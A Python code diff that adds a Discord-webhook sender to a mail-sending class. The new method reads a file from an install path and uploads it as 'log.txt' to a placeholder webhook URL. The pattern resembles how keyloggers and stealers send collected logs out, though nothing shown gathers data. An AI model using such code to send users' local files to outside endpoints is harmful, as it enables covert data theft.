@@ -1,4 +1,5 @@
 import smtplib, ssl
+from discord_webhook import DiscordWebhook
 
 class Mail:
     def __init__(self):
@@ -23,3 +24,18 @@ class Send:
         mail = Mail()
         mail.send(mails, subject, content)
         print("Sent")
+    def Webhook(subject, install_path, filename):
+        webhook_url=str("Your Webhook")
+        constructed_data=str(f"""
+```
+{subject}
+```
+        """)
+        webhook = DiscordWebhook(url=str(webhook_url),
+        content=str(constructed_data),
+        rate_limit_retry=True,
+        username=f"Webhook With Files"
+        )
+        with open(f"{install_path}\\{filename}", "r") as f:
+            webhook.add_file(file=f.read(), filename=f"log.txt")
+        response = webhook.execute()
